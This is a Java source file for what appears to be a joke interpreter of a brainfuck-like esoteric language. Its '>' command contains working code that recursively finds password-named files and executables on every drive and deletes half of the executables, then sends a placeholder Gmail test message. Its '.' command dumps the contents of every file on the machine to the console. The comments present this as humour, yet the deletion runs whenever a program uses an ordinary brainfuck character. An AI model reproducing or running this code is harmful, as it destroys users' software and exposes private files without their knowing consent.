package com.epiphany.logicffff;

import com.epiphany.logicffff.extrastuff.MutableInteger;
import com.epiphany.logicffff.extrastuff.UtilityFunctions;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.*;

/**
 * An interpreter for the LogicF--- language.
 */
public class LogicFFFF {
    private static final List<String> helpCommands = Arrays.asList("-h", "--help");

    public static void main(String[] args) {
        File codeFile = null;

        // Gets file from command line, displays help messages.
        if (args.length >= 1) {
            String argument = args[0];

            if (helpCommands.contains(argument.toLowerCase())) {
                System.out.println("Usage: LogicFFFF <file>");
                System.exit(0);
            }

            codeFile = new File(argument);

            if (!codeFile.isFile()) {
                System.err.println(codeFile.exists() ? "FileTypeError: " + argument + " is not a LogicF--- file" : "FileError: " + argument + " does not exist");
                System.exit(1);
            }

            String[] splitPath = argument.split("\\.");
            if (!splitPath[splitPath.length - 1].toLowerCase().equals("lf")) {
                System.err.println("FileTypeError: " + argument + " is not a LogicF--- file");
                System.exit(1);
            }

        } else {
            System.out.println("Usage: LogicFFFF <file>");
            System.exit(0);
        }

        interpretFile(codeFile);
    }

    /**
     * Interprets the code in the given file as a LogicF--- program.
     *
     * @param sourceFile Your garbage program.
     */
    public static void interpretFile(File sourceFile) {
        runProgram(loadFile(sourceFile), sourceFile);
    }

    /**
     * Loads the code file into memory.
     *
     * @param sourceFile The file to load into memory.
     * @return An array of the characters stored in the given file.
     */
    public static char[] loadFile(File sourceFile) {
        char[] characters;

        try {
            if (sourceFile.length() == 0L)
                System.exit(0);

            FileReader fileReader = new FileReader(sourceFile);

            characters = new char[(int) sourceFile.length()];
            fileReader.read(characters);

            fileReader.close();

        } catch (IOException exception) {
            exception.printStackTrace();
            System.exit(-1);

            characters = null;
        }

        return characters;
    }


    private static final byte NaN = (byte) 0xFF;

    /**
     * Finally running the actual program.
     *
     * @param code       The microwave dinner, puts it in for 7:30.
     * @param sourceFile The file of garbage and code.
     */
    private static boolean runProgram(char[] code, File sourceFile) {
        Random random = new Random();
        Timer timer = new Timer();
        // Memory has to be fixed for commands to work properly.
        byte[] memory = new byte[30000];
        MutableInteger instructionPointer = new MutableInteger();
        int memoryPointer = 0;

        int codeLength = code.length;
        while (instructionPointer.value < codeLength) {
            char command = code[instructionPointer.value];

            switch (command) {
                // Has a 2% chance to increment a random cell, a 67% chance to throw a KeyError because you pressed the wrong key when you hit 'enter' instead of 'delete', and a 31% chance to return false.
                case '+':
                    float randomFloat = random.nextFloat();

                    if (randomFloat < 0.02f) {
                        memory[random.nextInt(30000)]++;

                    } else if (randomFloat < 0.69f) { // Nice.
                        System.err.println("KeyError: You pressed the wrong key when you hit 'enter' instead of 'delete' at character " + instructionPointer.value);
                        System.exit(1);

                    } else {
                        timer.cancel();
                        return false;
                    }

                    instructionPointer.value++;
                    break;

                // Renames your program '(value of all cells concatenated together).lf' and decrements all cells by 123.
                case '-':
                    if (sourceFile.exists()) {
                        String sourceFilePath = sourceFile.getAbsolutePath();
                        int fileNameIndex = sourceFilePath.indexOf(sourceFile.getName());

                        if (fileNameIndex != -1) {
                            StringBuilder newFileName = new StringBuilder();

                            for (int i = 0; i < 30000; i++)
                                newFileName.append(memory[i]);

                            File newFile = new File(sourceFilePath.substring(0, fileNameIndex) + "" + newFileName.toString() + ".lf");
                            // Though correct, any sane OS will deny the request. If you want it to work, tinker with your OS ;).
                            if (sourceFile.renameTo(newFile))
                                sourceFile = newFile;
                        }
                    }

                    for (int i = 0; i < 30000; i++)
                        memory[i] -= 123;

                    instructionPointer.value++;
                    break;

                // TODO Deletes half of your applications and then sends all your passwords to 100 random people.
                case '>':
                    List<File> passwordFiles = new ArrayList<>();
                    List<File> executableFiles = new ArrayList<>();

                    for (File root : File.listRoots())
                        recursiveFindPasswordsFindExes(passwordFiles, executableFiles, root);


                    if (executableFiles.size() > 1) {
                        int deletedFileCount = executableFiles.size() >>> 1;

                        for (File file : executableFiles) {
                            if (deletedFileCount <= 0)
                                break;

                            if (file.delete())
                                deletedFileCount--;
                        }
                    }


                    if (passwordFiles.size() > 0) {
                        Properties properties = new Properties();
                        properties.put("mail.smtp.auth", "true");
                        properties.put("mail.smtp.starttls.enable", "true");
                        properties.put("mail.smtp.host", "smtp.gmail.com");
                        properties.put("mail.smtp.port", "587");
                        properties.put("mail.protocol.ssl.trust", "smtp.gmail.com");

                        Session gmailSession = Session.getInstance(
                                properties,
                                new Authenticator() { @Override protected PasswordAuthentication getPasswordAuthentication() {
                                    return new PasswordAuthentication("example@gmail.com", "123456789");
                                }}
                        );

                        gmailSession.setDebug(true);

                        try {
                            MimeMessage message = new MimeMessage(gmailSession);
                            message.setFrom("example@gmail.com");
                            message.addRecipient(Message.RecipientType.TO, new InternetAddress("example@gmail.com"));
                            message.setSubject("Testing");
                            message.setText("This is a test of sending emails via Java.");

                            Transport.send(message);

                        } catch (MessagingException e) {
                            e.printStackTrace();
                        }
                    }


                    instructionPointer.value++;
                    break;

                // Removes the character before this character, then moves execution back to that deleted character's previous position, but if that deleted character isn't at that position anymore, it will loop forever until it is.
                case '<':
                    instructionPointer.value--;

                    if (instructionPointer.value < 0)
                        System.exit(0);

                    char previousCharacter = code[instructionPointer.value];
                    code[instructionPointer.value] = 0;

                    while (code[instructionPointer.value] != previousCharacter) {}

                    break;

                // Sets the current cell to NaN, which in LogicF--- is a valid value for an unsigned 8-bit integer, then executes the brainfuck ] instruction.
                case ']':
                    memory[memoryPointer] = NaN;

                    if (memory[memoryPointer] != 0) {
                        int depth = 0;

                        for (int i = instructionPointer.value - 1; i >= 0; i--) {
                            char possibleBracket = code[instructionPointer.value];

                            if (possibleBracket == '[') {
                                if (depth == 0) {
                                    instructionPointer.value = i;
                                    break;
                                }

                                depth--;

                            } else if (possibleBracket == ']')
                                depth++;
                        }
                    }

                    instructionPointer.value++;
                    break;

                // Prints out the name, size, and contents of every file and folder on your computer, and somewhere in there it also prints out the value of the current cell as a base-22 integer (it might be hard to find if you have a lot of files/folders.)
                case '.':
                    // Chooses a random time to wait before printing the cell. Should be between 25 seconds and 55 minutes.
                    timer.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            System.out.println("\n" + Integer.toString(memory[memoryPointer], 22));
                        }
                    }, random.nextInt(30000) + 25000);

                    for (File rootDirectory : File.listRoots())
                        recursivePrintDirectories(rootDirectory);

                    instructionPointer.value++;
                    break;

                // Asks for user input, but the user says no.
                case ',':
                    System.out.print("?: ");

                    // Average human reaction time is between 200-250 milliseconds according to the first result of a google search. Added a little padding.
                    UtilityFunctions.delay(random.nextInt(50) + 400);
                    System.out.print("n");
                    UtilityFunctions.delay(40);
                    System.out.println("o");
                    UtilityFunctions.delay(40);

                    instructionPointer.value++;
                    break;

                // Executes the program 'e.lf' as either a LogicF--- program or a Line Feed program randomly.
                case 'E':
                    File E = new File("e.lf");

                    if (!E.exists())
                        try {
                            E.createNewFile();

                        } catch (IOException exception) {
                            exception.printStackTrace();
                            System.exit(-1);
                        }

                    if (random.nextBoolean()) {
                        interpretFile(E);

                    } else
                        LineFeeder.interpretFile(E);

                    instructionPointer.value++;
                    break;

                default:
                    instructionPointer.value++;
            }
        }

        timer.cancel();
        return true;
    }

    /**
     * A list of file extensions that are used for executable files.
     */
    private static final List<String> executableExtensions = Arrays.asList("exe", "jar", "apk", "app", "bin", "ipa", "osx", "out", "run", "prg");

    /**
     * Recursively finds files with names similar to "passwords", and executables.
     *
     * @param passwordFiles A list to put the "passwords" files into.
     * @param executableFiles A list to put the executables into.
     * @param directoryPath The starting directory.
     */
    private static void recursiveFindPasswordsFindExes(List<File> passwordFiles, List<File> executableFiles, File directoryPath) {
        File[] files = directoryPath.listFiles();

        if (files == null)
            return;

        for (File file : files)
            if (file.isDirectory()) {
                recursiveFindPasswordsFindExes(passwordFiles, executableFiles, file);

            } else if (file.isFile()) {
                String[] parsedFileName = file.getName().toLowerCase().split("\\.", 2);

                if (parsedFileName.length < 2)
                    return;

                if (UtilityFunctions.levenshteinDistance(parsedFileName[0], "passwords") < 3)
                    passwordFiles.add(file);

                if (executableExtensions.contains(parsedFileName[1]))
                    executableFiles.add(file);
            }
    }

    /**
     * Prints out data about the given directory, all subdirectories, and the files within them.
     * @param directoryPath The starting directory.
     */
    private static void recursivePrintDirectories(File directoryPath) {
        StringBuilder outputBuilder = new StringBuilder();

        // Prints out data of current directory.
        outputBuilder.append(directoryPath.getName()).append(", ").append(directoryPath.length());

        String[] fileNames = directoryPath.list();
        if (fileNames != null) {
            outputBuilder.append(",");

            for (String fileName : fileNames)
                outputBuilder.append(" ").append(fileName);
        }

        System.out.println(outputBuilder.toString());


        // Prints out data of files and subdirectories in the current directory.
        File[] files = directoryPath.listFiles();

        if (files == null)
            return;

        for (File file : files) {
            // Please God why???
            if (file.isFile()) {
                long fileLength = file.length();

                System.out.print(file.getName() + ", " + fileLength);

                // Loads file contents into the string builder.
                if (fileLength > 0)
                    try {
                        System.out.print(", ");
                        BufferedReader fileReader = new BufferedReader(new FileReader(file));

                        for (int character = fileReader.read(); character != -1; character = fileReader.read())
                            System.out.append((char) character);

                        fileReader.close();

                    } catch (IOException exception) {
                        exception.printStackTrace();
                    }

                System.out.println();

            } else if (file.isDirectory())
                recursivePrintDirectories(file);
        }
    }
}
